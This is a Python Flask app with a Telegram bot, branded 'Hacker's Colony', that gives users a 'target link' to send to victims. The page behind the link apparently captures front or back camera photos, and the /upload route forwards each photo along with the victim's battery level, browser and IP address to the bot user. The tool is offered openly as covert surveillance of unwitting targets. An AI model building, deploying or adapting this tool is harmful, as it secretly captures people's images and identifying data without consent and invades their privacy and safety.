import os, base64, threading, sqlite3, time, telebot
from flask import Flask, render_template, request, jsonify
from telebot import types

app = Flask(__name__)

BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMINS = [518067190, 7162565886] 

bot = telebot.TeleBot(BOT_TOKEN)

bot.remove_webhook()
time.sleep(2)

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front"),
        types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back"),
        types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"),
        types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190")
    )
    bot.send_message(message.chat.id, "<b>Welcome to Hacker's Colony! 🎯</b>\nSelect your camera mode:", parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if "m_" in call.data:
        mode = call.data.replace("m_", "")
        link = f"https://{request.host}/?m={mode}&uid={call.message.chat.id}"
        
        response_text = (
            f"🤠 It's your target link 🔗 just send it your target 🎯\n\n"
            f"Url = ( {link} )\n\n"
            f"✨ Thank you team HCO ✨"
        )
        bot.send_message(call.message.chat.id, response_text, disable_web_page_preview=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    try:
        img_data = base64.b64decode(data.get('image').split(',')[1])
        info = data.get('info', {})
        caption = (f"🛡️ <b>Audit:</b> {data.get('mode').upper()}\n"
                   f"🔋 <b>Battery:</b> {info.get('battery')}\n"
                   f"🌐 <b>Browser:</b> {info.get('browser')}\n"
                   f"📍 <b>IP:</b> {request.remote_addr}\n\n"
                   f"✨ Created by Roshan ✨")
        bot.send_photo(data.get('uid'), img_data, caption=caption, parse_mode='HTML')
    except: pass
    return jsonify({"status": "success"})

if __name__ == "__main__":
    def run_bot():
        while True:
            try: bot.polling(none_stop=True)
            except: time.sleep(10)
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
    
